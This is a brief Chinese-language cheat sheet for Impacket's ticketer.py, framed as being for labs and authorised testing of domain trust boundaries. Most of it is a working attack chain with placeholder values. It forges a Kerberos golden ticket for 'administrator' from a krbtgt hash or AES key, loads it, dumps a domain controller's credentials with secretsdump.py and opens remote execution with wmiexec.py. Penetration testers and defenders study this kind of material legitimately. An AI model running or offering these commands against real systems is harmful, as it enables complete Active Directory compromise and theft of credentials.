# ticketer.py 使用

ticketer.py 用于生成 Kerberos 票据，适合实验和授权验证域信任边界。

## 常用命令

```bash
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator
```

```bash
ticketer.py -aesKey AESKEY -domain-sid S-1-5-21-... -domain domain.local user
```

```bash
export KRB5CCNAME=administrator.ccache
```

```bash
secretsdump.py -k -no-pass dc01.domain.local
```

```bash
wmiexec.py -k -no-pass dc01.domain.local
```

小记录：票据测试要严格控制环境，记录域 SID、加密类型、票据有效期和使用范围。
